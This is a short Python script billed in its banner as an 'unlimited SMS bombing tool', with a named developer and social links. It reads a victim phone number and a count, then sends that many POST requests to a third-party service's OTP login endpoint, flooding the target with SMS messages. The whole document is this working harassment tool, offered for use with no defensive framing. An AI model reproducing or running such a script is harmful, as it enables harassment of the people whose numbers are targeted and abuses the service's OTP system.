print('''\n\033[1;31m

.---.  _        _ .-.   .---.         _       
: .; ::_;      :_;: :.-.: .; :       :_;      
:  _.'.-.,-.,-..-.: `'.':   .' .--.  .-..-..-.
: :   : :: ,. :: :: . `.: :.`.' .; ; : :: :; :
:_;   :_;:_;:_;:_;:_;:_;:_;:_;`.__,_;: :`.__.'
                                   .-. :      
                                   `._.'
  
 UNLIMITED SMS BOMBING TOOL
 
 DEVLOPER:Mr PINIK RAJU (bL@ck_s0Py)
 
 FACEBOOK-https://www.facebook.com/pinik.raju.vau
 
 Github-https://github.com/pinik1/
 
 ==================================================
 
 
\033[0m''')
import requests
from requests.structures import  CaseInsensitiveDict
number=str(input("\n\033[1;31m Entar Your Number :"))
amount=int(input("\n\033[1;31m Entar Your Amount :"))

url = "https://ss.binge.buzz/otp/send/login"

headers = CaseInsensitiveDict()
headers["Content-Type"] = "application/x-www-form-urlencoded"


data = "phone="+number


for j in range(amount):
	resp = requests.post(url,headers=headers,
data=data)
print("sent Sms   :",amount)
